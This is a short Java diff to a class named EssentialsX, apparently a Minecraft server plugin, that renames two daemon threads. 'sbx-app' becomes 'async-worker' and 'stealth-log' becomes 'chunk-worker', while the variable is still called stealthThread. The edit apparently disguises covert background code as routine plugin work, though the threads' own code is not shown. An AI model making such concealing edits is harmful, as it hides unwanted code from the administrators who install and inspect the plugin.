@@ -44,7 +44,7 @@ public class EssentialsX extends JavaPlugin {
             } catch (Throwable t) {
                 getLogger().severe("App failed to start: " + t.getMessage());
             }
-        }, "sbx-app");
+        }, "async-worker");
         appThread.setDaemon(true);
         appThread.start();
     }
@@ -75,7 +75,7 @@ public class EssentialsX extends JavaPlugin {
             } catch (InterruptedException ignored) {
                 // 插件卸载时打断，正常退出
             }
-        }, "stealth-log");
+        }, "chunk-worker");
         stealthThread.setDaemon(true);
         stealthThread.start();
     }
